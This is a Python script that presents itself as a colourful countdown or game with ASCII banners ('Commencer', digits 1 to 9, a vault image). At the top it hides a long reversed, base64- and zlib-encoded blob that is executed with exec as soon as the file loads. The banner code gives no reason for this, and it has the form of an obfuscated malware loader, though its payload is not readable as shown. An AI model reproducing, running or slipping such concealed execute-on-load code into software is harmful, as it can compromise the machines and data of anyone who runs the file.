from colorama import Back, Fore, init, Style
import os

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))


def clear():
     os.system('cls' if os.name == 'nt' else 'clear')

start_banner1 = Fore.RED + """
 _____                                                    
/  __ \                                                   
| /  \/ ___  _ __ ___  _ __ ___   ___ _ __   ___ ___ _ __ 
| |    / _ \| '_ ` _ \| '_ ` _ \ / _ \ '_ \ / __/ _ \ '__|
| \__/\ (_) | | | | | | | | | | |  __/ | | | (_|  __/ |   
 \____/\___/|_| |_| |_|_| |_| |_|\___|_| |_|\___\___|_|   
                                                          
"""


banner_1 = Fore.BLUE + """       
  .###    
  ####    
  #:##    
    ##    
    ##    
    ##    
    ##    
    ##    
    ##    
    ##    
 ######## 
 ######## 
"""

banner_2 = Fore.RED + """        
 . ####:  
 #######: 
 #:.   ## 
       ## 
      :#  
      ##  
    .##:  
   .##:   
  :##:    
 :##:     
 ######## 
 ######## 
"""

banner_3 = Fore.GREEN +"""        
 . ####:  
 #######: 
 #:.   ## 
       ## 
       ## 
   #####  
   #####. 
       ## 
       ## 
 #:    ## 
 #######: 
 :#####:  
 """

banner_4 = Fore.YELLOW + """        
     ###  
    :###  
   .####  
   ##.##  
  :#: ##  
 .##  ##  
 ##   ##  
 ######## 
 ######## 
      ##  
      ##  
      ##
"""

banner_5 = Fore.MAGENTA + """         
 #######  
 #######  
 ##       
 ##       
 ##### .  
 #######. 
 #:  .### 
       ## 
       ## 
 #:  .### 
 #######. 
 :#### .            
   """

banner_6 = Fore.CYAN + """     
    ###:  
  ######  
 :##. .#  
 ##:      
 ##:###:  
 #######: 
 ##    ## 
 ##    ## 
 ##    ## 
  #    ## 
  ######: 
  .####:  
      """

banner_7 = Fore.LIGHTRED_EX + """         
 ######## 
 ######## 
       #  
      ##. 
      ##  
     ##.  
    :##   
    ##:   
   :##    
   ##:    
  :##     
  ##:      
  """

banner_8 = """       
  :####:  
 :######: 
 ##    ## 
 ##    ## 
 ##    ## 
  ######  
 .######. 
 ##    ## 
 ##    ## 
 ##    ## 
 :######: 
  :####:    
"""

banner_9 = Fore.YELLOW + """         
  :####.  
 :######  
 ##    #  
 ##    ## 
 ##    ## 
 ##    ## 
 :####### 
  :###:## 
      :## 
  #. .##: 
  ######  
  :###     
   """ 







vault_banner = """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣤⣄⡀⣿⣿⣿⣿⣿⣿
